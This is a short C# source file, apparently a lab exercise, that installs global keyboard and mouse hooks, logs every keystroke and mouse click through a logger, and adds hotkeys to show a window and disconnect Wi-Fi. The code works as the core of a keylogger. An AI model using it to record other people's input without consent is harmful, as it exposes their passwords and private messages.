using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using SimpleWifi;

namespace Lan8._1_GlobalHooks
{
    internal class HookController
    {

        public delegate void ShowMainWindowHandler();

        public event ShowMainWindowHandler ShowWindow;

        private readonly IKeyboardMouseEvents _globalHook = Hook.GlobalEvents();
        private readonly Logger _logController;
        private readonly Wifi _wifi = new Wifi();

        public HookController(ConfigFile config)
        {
            _logController = new Logger(config);

            _globalHook.KeyDown += KeyDown;
            _globalHook.MouseClick += MouseClick;
        }

        private void MouseClick(object sender, MouseEventArgs e)
        {
            _logController.LogMouse(e.Button.ToString(), e.Location.ToString());
        }

        private void KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyData)
            {
                case Keys.Alt | Keys.Space:
                    ShowWindow?.Invoke();
                    e.Handled = true;
                    return;
                case Keys.Control | Keys.Shift | Keys.W:
                    _wifi.Disconnect();
                    e.Handled = true;
                    return;
            }
            _logController.LogKeyboard(e.KeyData.ToString());
        }
    }
}
